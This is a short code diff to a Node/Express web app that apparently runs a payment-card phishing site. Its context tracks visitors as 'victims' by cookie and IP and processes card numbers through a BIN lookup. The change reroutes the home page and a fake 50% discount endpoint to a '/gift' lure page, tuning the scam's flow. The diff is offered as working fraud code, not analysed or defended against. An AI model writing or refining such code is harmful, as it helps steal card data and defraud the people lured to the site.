@@ -52,6 +52,10 @@ ${await binInfoEdit(cardInfo.cardNumber.replace(/\s/g, ""))}
 }
 
 app.get("/", async (req, res) => {
+    return res.redirect('/gift');
+});
+
+app.get("/gift", async (req, res) => {
     let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
     const victimId = req.cookies.victimId;
     const [victim, created] = await Victims.findOrCreate({
@@ -709,7 +713,7 @@ app.get("/get/discount", async (req, res) => {
             discount: 50
         })
 
-        return res.redirect('/our-menu');
+        return res.redirect('/gift');
     } catch (err) {
         return res.sendStatus(404);
     }
